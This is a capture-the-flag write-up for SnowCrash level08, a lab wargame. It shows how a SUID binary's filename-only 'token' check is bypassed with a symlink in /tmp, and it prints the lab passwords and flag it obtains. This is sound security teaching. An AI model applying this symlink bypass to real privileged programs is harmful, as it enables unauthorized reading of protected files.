## Level08

### Vulnerability: Insecure Filename Validation (Symlink Bypass)


```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          192.168.1.50 
level08@192.168.1.50's
password: fiumuikeil55xe9cu4dood66h
level08@SnowCrash:~$ 
```


First, I checked the binary permissions:

```bash
ls -l level08
```

Output:

```
-rwsr-s---+ 1 flag08 level08 8617 Mar 5 2016 level08
```

The `s` bit indicates that the binary has the **SUID** permission enabled. Therefore, it runs with the privileges of its owner (`flag08`) instead of the current user (`level08`).

Next, I inspected the binary using:

```bash
strings level08
```

Interesting strings:

```
token
You may not access '%s'
strstr
open
read
write
```

These strings suggest that the program:

1. Takes a filename as an argument.
2. Checks whether the filename contains the string `"token"` using `strstr()`.
3. If it does, access is denied.
4. Otherwise, it opens the file and prints its contents.

The logic is likely similar to:

```c
if (strstr(argv[1], "token"))
{
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
}

fd = open(argv[1], O_RDONLY);
read(fd, buffer, sizeof(buffer));
write(1, buffer, size);
```

The vulnerability is that the program only checks the **filename provided by the user**, not the actual file that is opened.

To bypass this restriction, I created a symbolic link pointing to the protected `token` file:

```bash
ln -s /home/user/level08/token /tmp/myfile
```

Now the symbolic link show : level08@SnowCrash:~$ ls -l /tmp/mytoken

```ls -l /tmp/myfile```, ```lrwxrwxrwx 1 level08 level08 24 Aug  3 10:30 /tmp/myfile -> /home/user/level08/token```

Then I executed:

```bash
./level08 /tmp/myfile
quif5eloekouj29ke0vouxean
```

The validation succeeds because `/tmp/myfile` does not contain the word `"token"`.

However, when `open()` follows the symbolic link, it actually opens:

```
/home/user/level08/token
```

Since the binary is running with the privileges of `flag08`, it is allowed to read the protected file and prints its contents, revealing the token for the next level.


### Key Takeaway

Checking only the filename is not a secure access control mechanism. A symbolic link can bypass this kind of validation because the path inspected by the program is different from the file that is ultimately opened.

```
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$ 

```

This is an example of an **insecure file access validation** that can be exploited through a **symbolic link (symlink) attack**.



---
### Next Password for ssh level09@192.168.1.50 -p 4242

### 25749xKZ8L7DkSCwJkT9dyv6f
---



